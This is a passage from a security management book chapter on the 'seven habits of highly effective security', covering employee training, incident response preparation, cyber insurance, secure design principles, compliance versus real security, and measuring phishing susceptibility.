deadline. And well before relying on a penetration test,  the best way to ensure security is to design it into software. Conducting  architectural risk analysis prior to and as software is getting built, with  both automated and manual code reviews is a better approach. Consider  avoiding the posture of being acted upon as much as possible and  minimizing the time spent in that zone.   Train Employees Continuously  The most proactive and prepared companies engage in ongoing training,  education, and development of their workforce. In-depth training is  important for information security personnel, and awareness training is  important for all employees, contractors, and third-party partners. We also  highly recommend that all developers are continuously trained in secure  coding practices and are updated on emerging threats. For information  security personnel, it means doing more than sending your two smartest  engineers to Las Vegas to attend the Black Hat security conference  each year. For all employees, engaging in anti-phishing training and  ongoing simulation will pay dividends in reducing risks and falling prey  to tricks, especially if your organization has not deployed multi-factor  authentication or hardware token–based authentication  e.g., YubiKey .  Creating awareness and having fun with the training can help reduce the  trove of dollars going to scammers using classic “Need help sending an  urgent wire” or “Can you do me a favor” emails sent disguised as coming  from your CEO.  199   Chapter 9    the Seven habitS of highly effeCtive SeCurity  We want to emphasize and encourage you to train all of the human   capital that runs your company, regardless of their employment status or  relationship with your organization. We have seen too many third-party  providers get compromised and impact the organization they support.  For example, if one of your key partners falls prey to a phishing attack  that leads to a major ransomware situation, you may end up feeling the  pain just as much as your partner who is the primary victim. Training and  ongoing education should also be tied to rewards. Consider highlighting  and recognizing teams and individuals.     Which department is most engaged and has high   scores for not clicking phishing links?     Which scrum teams have completed their secure   coding training?     Which teams have the least amount of security bugs to   fix or the fastest speed of closing said vulnerabilities?  Executives need to see these results and understand their team’s   readiness as well as their progression.   Proactively Build and Maintain Your Support Network  Security and technology leaders need to be proactive about having a  support network of other professionals outside the firm that they trust  and collaborate with. Proactively building a powerful support network is  valuable and should be something you invest in. While it does not require  a financial cost to continuously build and develop an external support  network of peers and advisers, it requires an investment in time from  leaders at all levels. It also requires that you add value and help others to  nurture the right relationships.  200   Chapter 9    the Seven habitS of highly effeCtive SeCurity  In Adam Grant’s research and book, Give and Take,3 he demonstrated   that givers are the people that contribute to others without seeking  anything in return and have the most powerful networks. They move in  the world and offer their time to provide advice, share knowledge, or make  valuable introductions. Takers, on the other hand, are only focused on the  “what’s-in-it-for-me” mindset. They try to get other people to serve their  ends while carefully guarding their own expertise and time. We encourage  you to not be a taker. Build your network by being a resource to others. When you find yourself in a difficult situation, an effective approach  is to reach out to other experts in your community who can quickly give  you real advice that does not have strings such as selling their professional  services.  There is also a principle in life that states, you must first accumulate   power before you need it. This means that nurturing relationships and  being a resource to your network comes first. You want to have the network  already strong, vibrant, and established before your next major crisis. We  cannot stress the importance of continuously engaging in activities that  further support your network, a vital aspect of proactivity.  Although proactively building and supporting your network is a   good practice in general, it is especially important in security. As a  community, we have not been doing as good of a job as our adversaries.  Hackers and cybercriminals regularly exchange information with each  other and collaborate against common targets and enemies that they  have. Sometimes they pay each other as part of their interactions in the  cybercriminal underground and as part of a cybercriminal value chain.  However, we are pretty sure that no cybercriminal has ever lost a week or  two before potentially collaborating waiting for a nondisclosure agreement  to be signed. Also, many companies sometimes keep details about who  they think may be attacking them close to their vest, instead of sharing   3 Grant, A.  2014 . Give and take: A revolutionary approach to success. London:  Weidenfeld & Nicolson.  201   Chapter 9    the Seven habitS of highly effeCtive SeCurity  details that could help companies jointly fight against common adversaries.  In the past decade, there has been more information sharing across  security teams than ever before, with high-tech companies collaborating  in confidential, vetted groups and financial institutions also doing so in  groups such as FS-ISAC  the Financial Services Information Sharing and  Analysis Center . That said, we’re probably still as a community not sharing  as aggressively and as fast as cybercriminal groups.  Some specific reasons why you want to have access to a powerful   support network include:     Benchmarking with your peer group. Try to better   understand industry trends based on what your  colleagues are seeing vs. what your vendors might be  leading you to believe. For example, the Building Security  In Maturity Model  BSIMM  benchmark allows one  to assess the maturity of your organization’s software  security practices as compared to peer organizations.     Threat intelligence sharing groups can provide   information about particular adversaries that are  targeting the sector that your business operates in.  Such groups also exchange technical indicators of  compromise  IOCs  and indicators of attack  IOAs   in the form of malicious URLs, hashes signatures of  malware, and other signs that one can automatically  scour systems for to determine if an adversary has been  targeting or has successfully attacked your systems.     Contacts within the FBI and DHS provide you with   faster access to information on nation-state adversary  threats and better engagement. This also means that  you find ways to give back to support their ongoing  cybersecurity work.  202   Chapter 9    the Seven habitS of highly effeCtive SeCurity     Be a credible source of talent referrals as well as   providing references and background information on  candidates going through the hiring process.   Be Prepared Andy Grove, the former CEO of Intel, believed that even though you can’t  possibly have a formal plan for every possible situation, you still must plan  ahead and be prepared:  You need to plan the way a fire department plans: It cannot  anticipate  where  the  next  fire  will  be,  so  it  has  to  shape  an  energetic and efficient team that is capable of responding to  the unanticipated as well as to any ordinary event.4  Preparation is key, and when applied systematically, it can make all the   difference between a limited incident and a large-scale breach that wipes  out hundreds of millions of dollars of shareholder value. Times of chaos  and intense public scrutiny are not the best time for developing a coherent  process and a communications strategy. In other words, be prepared and  ready. Do not wait for a call from the FBI informing you that they believe  that your systems might have been breached or until a Wall Street Journal  reporter reaches out to your firm requesting comments on a potential issue  before you enact your plan.   Regularly Evolve Your Incident Response Strategy  We have urged companies to not treat incidence response simulation  as an annual event, as is necessary  but far from sufficient  by various  compliance standards. Incident response strategy should be a living  process that continuously evolves alongside your organization. Assess your   4 Grove, A. S.  1983 . High Output Management. New York, NY: Souvenir Press.  203   Chapter 9    the Seven habitS of highly effeCtive SeCurity  internal capabilities as well as develop relationships with external incident  response service providers and law firms that specialize in cybersecurity  to support your internal team. Having reputable firms engaged before you  need them might be one of the best decisions you make.   As part of this preparation step, also engage with business   stakeholders. For example, over the past several years, we have seen that  working closely with your head of marketing or CMO is vital for digital  businesses. Every minute of everyday marketing data that has partial and  oftentimes complete PII is flowing between your systems and external  partners. Developing a good working relationship and understanding  between these functions ahead of a real incident is vital.   Engage Forensics Firms Before You Have an Incident  As part of your incident response strategy, you need to ensure there are at  least two well-regarded forensics firms engaged with your organization  with a retainer and an agreement in place. We say at least two because  in the midst of a crisis you want to have redundancy in case one of the  firms is already consumed by a similar incident at another customer or  might not have the right talent available to you. If you do have a significant  breach, you are going to need two firms because you want them to check  each other’s work  similar to seeking a second doctor’s opinion . Do not  assume that each firm would treat the incident in the same way. If you ever  find yourself in a situation where you may have to testify to Congress at  some point about a breach, what the firms discover and document and the  actions that they help you take in the midst of a breach investigation are of  immense, critical importance. It could even make the difference between  whether or not you’ll end up in front of Congress for the wrong reasons.  Because of the role that forensics plays, you want to have them engaged as  early on in the process as possible to aid in containing an attack in progress  and with investigation of the breach or security incident after an attack.  204   Chapter 9    the Seven habitS of highly effeCtive SeCurity   Cyber Insurance  Calling an insurance company while the building is burning down to  get a quote on fire insurance policy is clearly too late, and the same goes  for a cyber insurance policy. A good policy needs to be in place prior to  the discovery of a breach. Cyber insurance policies should be chosen  and tailored to your business. Determining what your crown jewels are,  how much consumer PII you have, where it is stored, and how much  coverage you need is a critical first step. A good cyber insurance policy  can cover many of the costs associated with a network security incident  IT  forensics, legal expenses, data restoration as well as breach notifications  to consumers , network business interruptions  lost profits from security  failures , and privacy incidents and liability coverage  class action litigation  and legal expenses and fines . The broad category of errors and omissions  coverage can also potentially be included, and specific riders may also be  available for specific types of incidents such as ransomware attacks.   Practice Your Communications Tools and Process  Regularly practice and stay sharp with your communications. Is the list  of leaders and executives current? Are you sending sensitive information  to a cell phone that belonged to your former CFO? How often do your  managers wait before telling HR when an employee or a contractor has  been terminated? Once HR has been informed of the termination, how  quickly is that information acted upon to cut off access?  One underlying key part of being proactive is to constantly practice  the basics and get the basics right. Pilots are required to keep flying and  landing their jets, regardless of the number of past missions. Firefighters  are required to get dressed and be ready to respond within a set time.  Adopting those types of practices is key to being crisp and clear with both  your external and internal communications.  205   Chapter 9    the Seven habitS of highly effeCtive SeCurity  Also, the ability to quickly spin up a security war room and get all  the key stakeholders engaged to collaborate on working an incident is  of critical importance. Running such war rooms is challenging when  all employees are on site, at the same location, and looking at the  same whiteboard and screens. Running such war rooms is even more  challenging when everyone is working remotely and has to coordinate  virtually rather than be in one place looking at the same set of screens,  whether it be due to an incident occurring on a weekend or due to  employees being forced to work from home during COVID-19 shelter-in-  place orders.   Be Paranoid Assume that the attackers are already in your network and have  access to some of your systems. The hope is that they have not already  compromised critical infrastructure, but ask yourself—if they did, how  can you systematically identify them and kick them out? In addition, given  the mobile nature of the devices connecting to your corporate systems,  assume that part of your network and some of your employees have  already been compromised.  Assume that cybercriminals already know some of your employee   passwords and can log in to their accounts. Some of your employees  may be using the same passwords for their corporate systems as they  are for their personal online accounts at popular web mail, social media  providers, and file sharing services. As large numbers of stolen credentials  from such services that have been breached are available on the dark  web, cybercriminals and nation-state attackers try using those to log in to  corporate systems. Even if you are using multi-factor authentication, once  a password is stolen, employees can be duped and socially engineered to  click “Approve” login requests on their mobile devices that are not their  own and done with a password bought off the dark web. You can partner  with companies that monitor the dark web for a living to determine which   206   Chapter 9    the Seven habitS of highly effeCtive SeCurity  of your employee’s corporate passwords may be in common with those  in stolen or purchased online password dumps, and you can have those  passwords reset proactively. When you hear of a competitor’s data sold on  the dark web, don’t rejoice but double down on your efforts with your team  to understand how you could have avoided such an attack yourself or at  least reduced its impact on your brand and business.  There are some interesting sayings in the information security   field—one is “There are two kinds of organizations. Those that have been  breached and those that don’t know that they have been breached.”  See  Figure 9-1.    Figure 9-1.  “Only two kinds of companies…”5  Paranoia is an important part of the right mindset to achieve security.   In general, people that are the most successful in business are confident  and optimistic—such is the right mindset needed to grow a business.  On the other hand, the right mindset to prevent loss of business is to be  paranoid and assume the worst. A middle ground is to have a healthy  paranoia that will keep the team sharper than a more complacent team  that’s reactively waiting for an alert or a red alarm to go off. The paranoid   5 www.tag-cyber.com media charlie-ciso only-two-kinds-of-companies  207   Chapter 9    the Seven habitS of highly effeCtive SeCurity  team is constantly looking for new instrumentation to give them more  visibility—both deep and wide coverage. They monitor their networks and  the redefined boundaries created by the public cloud and SaaS providers.  They are also not just looking down on the technology, but also looking up  to see how their business and strategy are changing—and learning what  new products or services are being planned that might introduce new  vulnerabilities. Finally, the paranoid managers are able to both continue  to practice the basics and deliver the fundamentals with excellence while  also working with new security startups to learn how innovation can be  applied to better protect their organizations.   Habit 2. Be Mission-Centric This second habit is probably one of the most fundamental and critical  habits for any organization that wants to increase its odds of avoiding a  severe breach. We begin with a general discussion about management  attention. By doing that first, we want to admonish the reader to connect  the dots between security and their organization’s mission. Cybersecurity  is not just an information technology  IT  issue to be addressed by a small  part of the overall organization. Security needs to be evaluated from the  lens of how it can help support your organization’s mission—regardless  if that means a not-for-profit, a government agency, or a fast-growing  business.   Organizational Focus Leaders across all organizations focus their time, resources, and  management attention on furthering the organization’s mission.  Ultimately delivering outcomes and keeping their commitments to  their stakeholders is what gets rewarded. Issues or priorities that are  not considered “critical issues” for the business get less priority, less   208   Chapter 9    the Seven habitS of highly effeCtive SeCurity  discussion, and often fewer resources—capital and human. Trust is  usually central to an organization’s mission—whether it be the trust of  the customers, users, partners, or employees—and security provides one  of the underpinnings upon which trust can be based. As such, we have  attempted to share primary learnings from the world’s most impactful  breaches, and by now it should not be difficult to have a line of sight  between good security practices leading to good business operations.   Mission-Centric Activities All successful organizations are always engaging in three discrete activities,  which we describe here briefly.   Mitigating Risks Every business has risks—competitive risk, strategic risk, compliance risk,  operational risk, financial risk, and, of course, security risk. On the security  risk front, each day brings with it new threats that need to be addressed.  Mitigating threats that can harm the business and the shareholder’s  interests must be dealt with. Risks can be created or can change as a  result of many factors: economic downturns, pandemic, regulations,  trade conflicts, and technology disruption, to name a few. Such risks can  evolve slowly or appear suddenly. When it comes to cybersecurity risk,  which may involve risk due to breach, risk due to compliance, and risk  due to regulation, such risks can be mitigated in a variety of ways, ranging  from employing technology to prevent or detect potential compromise or  breach, instituting processes to monitor the risk, or even transferring the  risk by getting a cyber insurance policy  ideally after lowering it as much as  possible internally .  209   Chapter 9    the Seven habitS of highly effeCtive SeCurity   Fulfilling Obligations  Meeting business obligations and objectives is the second set of activities  that must be addressed. Businesses are constantly managing their many  obligations to all of their stakeholders: employees, customers, partners,  and shareholders, or owners. Paying taxes is an obligation that can  quickly become a threat. Adhering to federal employment guidelines is an  obligation of any business in the United States. Delivering quality products  with the right levels of security and privacy is an obligation to customers.   Taking Advantage of New Opportunities  Creating new opportunities is about advancing the business and moving  faster than your competitors. Expanding opportunities ranges from  bringing new products and services to market and launching new business  models to expanding into new territories. Businesses that do not respond  to new opportunities and also create the markets will find themselves less  relevant and, over time, will stop growing and eventually die.  Security can also be an enabler for taking advantage of new   opportunities. Achieving good security and then taking credit for good  security through achieving relevant compliance certifications can often  enable a business to grow faster. While your competitors are trying to  improve their security posture, you can move in faster and capture more  market share. For example, satisfying HIPAA compliance, for instance,  can open up sales to medical healthcare markets. Satisfying SOX security  controls enables a company to go public. Satisfying FedRAMP can open up  opportunities for contracts with government agencies.   Security as Sales Enablement  In our experience, we have seen large enterprise partnerships get awarded  to the business that has been able to demonstrate the highest level of  security over their competitor. For example, in the emerging space of   210   Chapter 9    the Seven habitS of highly effeCtive SeCurity  autonomous mobile robots  AMRs , companies that are awarded large  contracts are able to demonstrate their robots are secure and hardened  in such a way that they cannot be remotely controlled and hijacked to be  used as a terrorist weapon in public spaces such as airports. What was  once seen as an IT issue to be managed in the technology silo has emerged  to be a major enabler to help the sales team. In the era of big breaches, the  lowest price offerings might no longer satisfy enterprise customers with  major threats and obligations to oversee. Major enterprise deals are closed  when the vendor has competitive pricing and a credible security story that  can be described and demonstrated.  We will discuss in Chapter 11 the importance of being effective  storytellers and weaving a narrative. This responsibility falls on the  senior security and technology leaders to help the other business  leaders understand how cybersecurity is a critical issue that needs to be  considered when evaluating business threats, fulfilling obligations, and  exploiting new opportunities to accelerate growth and gain market share.  In our roles as CTO and CISO, we have personally made sure that sales and  marketing teams are armed with a compelling narrative that demonstrates  superior security over the competitors. The larger your customer, the more  they may appreciate learning about your security program.   Pulling It Together We have found that one of the effective ways to increase the focus  and connect the dots is to contribute to the same strategic plan that is  shared with the board and senior executives and demonstrate how the  cybersecurity programs support and enable the business to operate  and grow more safely. Every day there will be an opportunity to develop  and hone this habit. Every day there are new threats that will need to be  navigated.  211    the Seven habitS of highly effeCtive SeCurity  Chapter 9   Security Is Risk Mitigation There are still far too many organizations that have not evolved their  approach to managing security as a risk management exercise but treat it  as merely another IT “tax” for the geeks to address. Such an approach is  both dangerous and shortsighted for the organization as a whole.  Since today’s modern businesses are powered by technology in just   about every aspect, security is much broader than an isolated set of  technical problems to solve. As you review the following questions, think  about whether they are simple IT or security issues that can be dealt with  in a silo or if they are connected to the overall mission of your organization  and require other major stakeholders in the company:     Do we enable two-factor authentication on our mobile   app to protect privacy or leave it alone to reduce  friction and usage?     How many different passwords do we want employees   to maintain to access our internal systems? What will  be the impact on employee productivity?     Marketing wants us to share our data sets with their   outside consulting firm—they sent us a secure Dropbox  link. We need them to analyze this data quickly to help  us launch our new promotional program.     We need to delay patching our mission-critical systems   until our busy peak season is over—we will be roughly six  months behind on patching some critical vulnerabilities.     Our innovation team has built its own Heroku   infrastructure outside of our controls. They said not to  worry because there is nothing running that is critical  yet. But we’re now getting access requests to open  connectivity to our production AWS environment.  212   Chapter 9    the Seven habitS of highly effeCtive SeCurity     We can’t onboard our largest new client this quarter   because they had some bad audit findings during their  last reporting year. Let’s stall the implementation.  Each day there are many questions and discussions like the ones   mentioned above taking place in corporations between employees just  trying to get their jobs done and security teams. Expanding the aperture of  these discussions to include business leaders to help in defining the best  course of action for your organization is vital for avoiding unnecessary  trouble down the road. We also recognize that general managers and  business leaders might not have the interest or had much background to  feel qualified to engage in the broader security topics, but we have found  that with some time and learning a few fundamentals, it is possible to offer  credible perspectives and help guide the teams to making better risk-based  decisions. Peter Drucker wrote, “The focus on contribution turns the  executive’s attention away from his own specialty, his own narrow skills,  his own department, and toward the performance of the whole.”6 We hope  that we have offered a compelling case for why we need each executive to  focus on the whole of the business by engaging with the technology and  security leaders.   Habit 3. Build Security and Privacy In  An ounce of prevention is worth a pound of cure.  —Benjamin Franklin  1736   Security and privacy need to be built into an organization at multiple   levels, starting with an organization’s culture, in order for that organization  to systematically produce offerings to the market that are secure and   6 Drucker, P. F.  2011 . The essential Drucker selections from the management  works. London: Routledge.  213   Chapter 9    the Seven habitS of highly effeCtive SeCurity  protect the consumer’s sensitive information. Having company leadership,  including the CEO, CTO, and CISO, present at company meetings regularly  to educate employees about how other companies are getting hacked,  the right mindset, and providing tips as continual reminders on avoiding  social engineering attacks helps create the right culture.  One important part of creating the right culture, after making sure that   the right mindset, values, and principles are instilled into the culture, is  to create “soft” and “hard” incentives that favor security. As an example  of a “soft” incentive through gamification, Salesforce, and specifically  innovators who have worked there such as Masha Sedova, developed a  company-wide, Star Wars–themed security awareness program in which  every employee started off as a “Padawan learner” and could grow to  become a Jedi master by not falling for the phishing email, detecting  the mole walking around the company without a badge, and generally  exhibiting positive security behaviors that would be tracked and used  to reward employees. Incentivizing the right behavior through “hard”  incentives such as financial bonuses or penalties or incorporating security  behaviors into employee performance reviews helps reinforce a culture  of security. Alternatively, setting the expectation that software developers  should produce secure code and penalizing them if there are security  vulnerabilities identified in their code can help create hard incentives.  Such hard incentives and expectations may also result in your managers  hiring engineers that value shipping secure products, especially if the  incentives and penalties “roll up” to impact managers as well.  Beyond creating a company culture supportive of security, a deeper   level in which security and privacy need to be built-in is in the area of  development of software products. Although no service or application  is perfect, approaching security by design means that you have thought  through the core architecture of how the service will be implemented and  deployed in production. How many points are allocated in each sprint to  address the vital nonfunctional requirements that will protect and secure  the user’s data?  214   Chapter 9    the Seven habitS of highly effeCtive SeCurity  From looking at a new acquisition target to launching a new   partnership, trust should be part of the discussion from the inception to  launch. Do not settle for the argument that “security will slow us down…  we will bring them in later.” That sentiment should be a signal that  business leaders and security and technology leaders need to work better  together. Keeping the security team out is no longer a viable solution, and  by the board setting the tone, it will become an issue for the management  team to address and resolve. Employing the principles of secure design will  help produce a far more secure solution than throwing a product over the  wall to the security team after the service has been deployed.  One needs to employ a set of well-known principles in order to   design security and privacy into a product. Back in 1973, Jerome Saltzer  and Michael Schroeder published a paper entitled “The Protection of  Information in Computer Systems”7 in which they described several  timeless principles that apply to designing security and privacy in even  today. We recount a subset of these principles here with some more  modern examples, including some aspects of the breaches discussed in  the first part of this book.   Keep It Simple  “Economy of Mechanism,”  “Least Common Mechanism”  Complexity is the enemy of security. The more complex anything  is, the harder it is to reason about it. So, the old adage “Kiss: Keep it  simple, stupid!”  or KISS  bears weight in security as well. In Saltzer and  Schroeder’s original paper, they discuss complexity in terms of feasibility  of being able to inspect code line by line and unwanted access paths that   7 Saltzer, J.H., & Schroeder, M.  1975 . The protection of information in computer  systems. Proceedings of the IEEE, 63, 1278-1308.  215   Chapter 9    the Seven habitS of highly effeCtive SeCurity  will not be noticed during normal use. However, the point of managing  complexity applies at the macro-level as well—to the entire systems and  collections of systems. For example, as large companies become even  larger through acquisition, it is important to simplify once an acquisition  takes place, to avoid having a plethora of potentially redundant,  complex legacy systems that perform similar functions. Maintaining  each such system and keeping them all secure is considerable work.  Some organizations that are good at doing acquisitions ensure that once  an acquisition has closed, there is a well-defined integration period,  after which many of the redundant systems at the acquired company  will be retired.  Or alternatively, the company may decide to choose to  standardize on a system from the acquired company that will replace a  system from the acquirer, taking the best of what both the acquirer and  acquiree have to offer.  In any case, once the integration of the acquisition  is complete, there should only be one system responsible for a particular  function  accounting, enterprise resource planning, customer relationship  management, source code management, etc. . As such, only one such  system needs to be maintained, patched, penetration tested, and so on.   Fail-Safe Defaults  “Secure by Default”  Don’t rely on the user to change any setting to be secure. Be paranoid— assume they will almost always get it wrong. The default setting should  be the more secure setting. For example, Amazon S3 buckets should be  set to private by default. Also, don’t ask the users if they want to make an  exception, say, to visit a page that might be infected with malware—they  may undoubtedly do so and can get infected.  216   Chapter 9    the Seven habitS of highly effeCtive SeCurity   Create a Security “Choke Point”  “Complete  Mediation”  If there are multiple ways to authenticate into a system, they all need to  be checked for correctness, and each of them is a distinct path that an  attacker can attempt to find vulnerabilities in and or bypass. By having a  single “choke point” and just one way to do it for a critical function such as  authentication, all efforts can be invested into getting that one mechanism  right. One might argue that by having one mechanism for authentication,  if an attacker bypasses that, they’ve got the keys to the kingdom, but if  there are multiple, it gives them more than one option to find something to  bypass.   Principle of Least Privilege The principle of least privilege states that users and programs should  only be given the minimum amount of privilege that they need to do  the job they are required to and no more. Thinking back to the Apache  Struts vulnerability from the Equifax breach in Chapter 4, web servers do  not need to run as an administrator to serve web pages. Such access can  allow attackers to copy a file with malware into shared memory, make  the file executable, and run the malware. Thinking back to the Marriott  breach from Chapter 3, a production database with up to 500 million user  records ran a non-whitelisted query issued by a human that was not a  query used by any of Marriott’s automated systems. Production database  privileges could have been configured to only run whitelisted queries used  by Marriott’s legitimate automated systems. Thinking back to the Capital  One breach from Chapter 2, the S3 bucket with 100 million credit card  applications may not have needed to be accessible by the web application  firewall.  217    the Seven habitS of highly effeCtive SeCurity  Chapter 9   Open Design No Security by Obscurity Assume the rebels will get the Death Star plans. Or, in the world of  computer security, assume that the attackers will get your architecture  diagrams and your source code. Do not assume that just because things  like source code or configuration files are not initially easily accessible, the  attackers won’t eventually get them. As such, do not store secrets such as  cryptographic keys in them.  Many systems have been hacked because source code or configuration   files stored in public repositories such as GitHub had cryptographic  keys for APIs, SSH passwords, and database credentials embedded in  them. Thinking back to the Equifax breach in Chapter 4, once attackers  had initially broken in by leveraging the Apache Struts vulnerability,  they would not have been able to access databases internally if database  credentials weren’t stored unencrypted in the obscurity of files on disk.   Ease of Use Psychological Acceptability If the secure way of doing things is too hard to use, users will inevitably get  it wrong or work around the secure way, usually resulting in insecurity.   A simple example is that if one increases how complex passwords should  be to such a great degree, then employees may begin to use post-it notes  on their laptops to remember the passwords. Stronger passwords prevent  a remote brute-force attacker from breaking into the system. However,  passwords that are too complex cause users to write them down, which  weakens the overall security and the intent to harden login credentials.  Users should ideally be using password managers  such as 1Password,  Dashlane, and LastPass  that allow them to have automatically generated,  strong, complex passwords, but that are easy enough to use that they are  much more preferable to writing down passwords on post-it notes.  218   Chapter 9    the Seven habitS of highly effeCtive SeCurity  A seminal paper around ease of use and security is Doug Tygar and  Alma Whitten’s “Why Johnny Can’t Encrypt.”8 In that paper, the authors  find that PGP  Pretty Good Privacy , a product designed to allow users  to securely email each other, was so hard to use that 25% of users in  their study actually ended up inadvertently sharing their private secret  keys with people they were trying to communicate with, resulting in  compromise of their secret keys.   Avoid Security Design Flaws To complement the preceding security design principles that make up  the principles to employ, there are also a set of key design flaws to avoid,  as described in “Avoiding the Top 10 Security Design Flaws”9 published  by the IEEE Center for Secure Design. The top 10 security design flaws  are discussed in much more detail in the 2014 paper co-authored by Gary  McGraw, Neil Daswani, Christoph Kern, Jim DelGrosso, Carl Landwehr,  Margo Seltzer, Jacob West, and a host of others in the field. The group that  developed these top 10 security design flaws came together from both top  high-tech companies  Google, Twitter, HP, RSA, Intel  and top academic  institutions  Harvard, University of Washington, George Washington  University . The industry participants analyzed data from vulnerabilities  in their products and the top design flaws that led to them. As per Gary  McGraw’s past work, vulnerabilities were root caused to either be the result  of design flaws or implementation vulnerabilities  “bugs” . A bug is an  implementation-level software problem. Bugs may exist in code but never   8 Ukrop, Martin & Matyas, Vashek.  2018 . Why Johnny the Developer Can’t Work  with Public Key Certificates. 10.1007 978-3-319-76953-0_3. 9 Arce, I., Clark-Fisher, K., Daswani, N., DelGrosso, J., Dhillon, D., Kern, C., Kohno,  T., Landwehr, C., Schoenfield, B.S., Seltzer, M., Spinellis, D., Tarandach, I., & West,  J.  2014 . Avoiding the Top 10 Software Security Design Flaws.  219   Chapter 9    the Seven habitS of highly effeCtive SeCurity  be executed. A flaw, by contrast, is a problem at a deeper design level and  may result in multiple implementation vulnerabilities. The top 10 security design flaws  paraphrased  are:    1   Earn or give, but never assume, trust.    2   Use an authentication mechanism that cannot be   bypassed.    3   Authorize after you authenticate.    4   Strictly separate data and control.    5   Define an approach that explicitly validates all   input.    6   Use cryptography correctly.    7    Identify sensitive data and how to handle it.    8   Always consider the users.    9   Understand how integrating external components   changes the attack surface.    10   Be flexible when considering future changes to   objects and actors.  The first design principle is at the heart of zero trust architecture, in  which users or devices are not trusted just because they are present on a  corporate network. Rather, the assumption is made that users or devices  on a network can be compromised and need to authenticate themselves to  internal services every time.  The second design principle is the complement of “complete   mediation use a choke point” from Saltzer and Schroeder’s security design  principles. Even decades later after the initial publication of those security  design principles, data from top high-tech companies were analyzed,  and it was found that many security vulnerabilities originated because  complete mediation was not being employed.  220   Chapter 9    the Seven habitS of highly effeCtive SeCurity  We refer the reader to the original “Top 10 Security Design Flaws”   paper for a detailed description of the other eight design flaws, but do feel  it was important to at least introduce both the principles to “do” and the  don’ts—the flaws to avoid—that make up the habit of designing security  and privacy in.   Habit 4. Focus on Security First; Achieve  Compliance as a Side Effect  Management  is  doing  things  right;  leadership  is  doing  the  right things.  —Peter Drucker  When we consult with companies and boards, we try to quickly assess   what kind of security program is being presented to us or discussed. We  become concerned when the focus of the discussion is about compliance  frameworks and audit results. We listen for what is left out. What about  the real world, in-the-trenches security countermeasure and controls,  and tactics that are required to safeguard the organization? We begin to  wonder what kind of problems are hiding underneath the compliance  activities and the checkboxes being checked. Drucker’s famous quote  that management is doing things right while leadership is doing the right  things applies to this habit. We believe that following a strict compliance  program without the right security tactics and controls is like doing a lot  of things right; that approach will certainly earn you some points and help  you pass compliance audits. However, the resources and focus going into  compliance might not be the right things for your business or appropriate  for protecting your most valuable data and assets. Hence, it might not  be addressing the most important things—the right things for your  organization.  221    the Seven habitS of highly effeCtive SeCurity  Chapter 9   Defend Your Turf Like a Security Rebel! A helpful analogy here is America’s revolutionary war between the British  Redcoats and the new American renegades fighting for independence  from the king of England. The British Army followed specific protocols of  what defined legitimate and orderly warfare: they stood in a single line and  row formations—it would have been dishonorable to not follow centuries-  old traditions in how they marched to battle, stood on the frontlines, and  faced their enemies—in this case, the natives and American rebels. The  Revolutionaries had employed different tactics against the more organized  army and well-supplied British Army. They fought a different war and  deployed new tactics: guerrilla warfare. They hid and surrounded their  enemies, attacking from the rear, and they dressed in civilian clothing, and  even sometimes in disguise. They were able to successfully push back the  all-powerful British forces because they were innovative with their tactics.  What we are advocating for here is to embrace cybersecurity as   American Revolutionaries and deploy tactics that are effective for your  given threats and risks in your business. Abandon outdated “traditions” or  activities that no longer serve your business but were part of “this is how  we do things around here.” Avoid doing things that either take attention  away from the core issues or, worse, give you a false sense of security by  having long compliance checklists that do little to actually protect your  business and customers from the real threats. Thinking like a hacker is a  far better posture than thinking like a classically trained IT auditor.  Examples of a defensive technology that take such an approach are   “deception” technologies and honeypots. Such technologies create a  plethora of seemingly real but virtual systems and targets for adversaries  to attack. If done correctly, attackers will not be able to distinguish  between real and virtual systems, and it will give them so many potential  internal targets to attack that it may just be easier for the attacker to   222   Chapter 9    the Seven habitS of highly effeCtive SeCurity  pursue targeting another organization. No compliance standard  at least  today  requires the use of deception technology, but leveraging deception  technology is a great way to defend your turf like a security rebel!  Applying this approach requires that cross-functional teams are   formed to look at the business holistically and think like a hacker who is  hell-bent on breaking into the environment. It means that the security  team has to be deeply embedded into the corporate IT and product  development teams and truly understand the end-to-end deployment  architecture. It requires the courage to make the right calls. For example,  prioritize securing the back-end ecommerce platform and front-end to  the ecommerce system and deprioritize patching the in-room iPads that  power the conference room technology and calendar.  We are not trying to discourage the reader from adopting and applying  compliance frameworks so long as the primary purpose is to advance the  security program. Too many times, organizations get so consumed by  complicated regulations and audits that they stop focusing on real security  altogether. They point to the latest checklist as the validation that they  are well protected. Our plea is that focus on threat detection, predictive  controls, preventive controls, and detective controls will provide   high-quality defenses which lets compliance be a byproduct of good  security practice rather than the other way around.   Habit 5. Measure Security Famous management consultant Peter Drucker once said, “If you can’t  measure it, you can’t improve it”  The Essential Drucker . So is the case  with security as well. In this section, we discuss the importance of both  quantitative  as well as qualitative  measurement and how measurement  can be used to achieve a level of security well beyond that can be achieved  by simple compliance with security standards. Checking a compliance  checkbox—either you have a security countermeasure in place or you  don’t—is typically not sufficient to achieve security. The real question is   223   Chapter 9    the Seven habitS of highly effeCtive SeCurity  how good the countermeasure is. Having some countermeasures in place  to check a box could potentially be better than having nothing, or it could  provide nothing but a false sense of security if the countermeasure is not  effective.  W. Edwards Deming is similarly credited with saying “you can’t  manage what you can’t measure.”10 Note that just because you can  measure and manage something, that doesn’t mean it is important or the  right thing to measure. That said, once you have determined what the right  thing to do is, you can figure out what is the right thing  or set of things  to  measure and then improve against it.  We provide examples of how to measure security quantitatively    and qualitatively  as well as what is worthwhile and not as worthwhile  to measure from the areas of anti-phishing, anti-malware, and software  vulnerability management, three of the six technical root causes of security  breaches.   Measuring Phishing Susceptibility Given that phishing is a prevalent root cause of breaches, one can have  employees take anti-phishing social awareness training in which they  are sensitized toward telltale signs of phishing attacks to make them less  susceptible to falling for attacks. Many compliance programs require  security awareness training, but just having employees take the training to  “check the box” does not tell you how effective the training is.  Many information security teams send out fake, test phishing   campaigns to gauge how effective such training actually is based on  the anti-phishing part of security awareness training. The hope is that  employees will be less susceptible to falling for phishing attacks after the  training as compared to before the training and how much less susceptible   10 Kaplan, R. S., & Norton, D. P.  n.d. . The balanced scorecard: Translating strategy   into action. Boston, MA: Harvard Business School Press.  224   Chapter 9    the Seven habitS of highly effeCtive SeCurity  can be quantitatively measured. There are challenges, of course, as each  test phishing email is different, and it may be hard to establish if employee  phishing susceptibility is actually lower or higher due to how deceptive or  tricky any given phishing email is. That said, over time, and with enough  tests, one can quantitatively measure if there is a trend in employees  becoming less susceptible to phishing attacks.  Measuring employee susceptibility to phishing, though, may not   be worthwhile to do if an organization has more or less eliminated the  threat of phishing attacks by deploying hardware tokens required for  authentication, such as YubiKey. That said, phishing emails could still have  